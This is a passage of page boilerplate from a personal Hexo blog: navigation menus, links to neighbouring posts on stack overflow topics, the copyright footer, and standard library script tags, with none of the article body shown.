rel="section"><i class="ic i-home"></i>Home</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>About</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>Posts</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>Archives</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>Categories</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>Tags</a></li></ul></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/2022/03/23/mpc-gmw/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2022/03/30/stackoverflow-ret2libc/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"></div><div class="status"><div class="copyright">&copy; <span itemprop="copyrightYear">2022</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">symlPigeon @ Another Gensokyo</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="Symbols count total">132k words</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="Reading time total">2:01</span></div><div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"2022/03/28/stackoverflow-learn/",valine:!0,fancybox:!0,copyright:'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html><!-- rebuild by hrmmi -->
